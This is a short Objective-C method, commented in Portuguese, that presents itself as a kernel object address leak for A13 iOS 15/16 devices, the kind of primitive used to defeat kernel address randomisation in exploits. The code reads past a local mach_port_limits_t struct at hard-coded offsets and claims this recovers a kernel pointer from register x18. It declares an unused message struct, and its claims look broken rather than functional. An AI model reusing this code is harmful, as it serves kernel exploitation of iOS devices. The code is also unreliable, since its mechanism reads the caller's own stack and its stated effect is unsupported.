- (uint64_t)leak_kobject_addr:(mach_port_t)port {
    uint64_t kaddr = 0;
    mach_port_t target_port = mach_task_self(); // Usa a própria task port
    
    struct {
        mach_msg_header_t head;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t port;
    } msg;

    // No A13, forçamos um trap de kernel que deixa o ponteiro no x18
    // seguido de uma leitura de atributo para capturar o resíduo
    mach_port_limits_t limits; 
    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
    
    if (mach_port_get_attributes(target_port, port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
        // Offset ajustado para capturar o frame de pilha do A13 (iOS 15/16)
        kaddr = *(uint64_t*)((uintptr_t)&limits + 0x20); 
    }
    
    // Fallback agressivo: se ainda for 0, tenta o offset do frame anterior
    if (kaddr < 0xFFFFFFF000000000) {
        kaddr = *(uint64_t*)((uintptr_t)&limits + 0x28);
    }
    
    return kaddr;
}
